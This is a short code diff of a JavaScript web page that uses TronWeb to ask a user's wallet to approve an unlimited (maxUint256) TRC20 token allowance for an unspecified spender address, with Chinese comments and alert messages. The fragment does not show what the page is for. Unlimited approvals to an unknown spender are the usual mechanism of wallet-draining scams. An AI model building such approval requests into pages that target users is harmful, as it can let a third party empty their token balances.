@@ -22,28 +22,15 @@
             }
 
             try {
-                // 构建交易数据
-                const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
-                    trc20ContractAddress,
-                    'approve(address,uint256)',
-                    {
-                        feeLimit: 10000000, // 可以根据实际情况增加费用
-                        callValue: 0
-                    },
-                    [
-                        { type: 'address', value: spenderAddress },
-                        { type: 'uint256', value: maxUint256 }
-                    ]
-                );
+                // 获取合约实例
+                const contract = await tronWeb.contract().at(trc20ContractAddress);
 
-                // 发送交易并请求签名
-                const result = await tronWeb.trx.sendRawTransaction(transaction.transaction);
+                // 调用合约的approve方法
+                const result = await contract.approve(spenderAddress, maxUint256).send({
+                    shouldPollResponse: true // 自动处理签名
+                });
 
-                if (result.result) {
-                    alert('授权请求已发送，请在钱包中完成签名！');
-                } else {
-                    throw new Error(result.message || '交易失败');
-                }
+                alert('授权成功！交易ID: ' + result);
             } catch (error) {
                 console.error('授权失败', error);
                 alert('授权失败: ' + error.message);
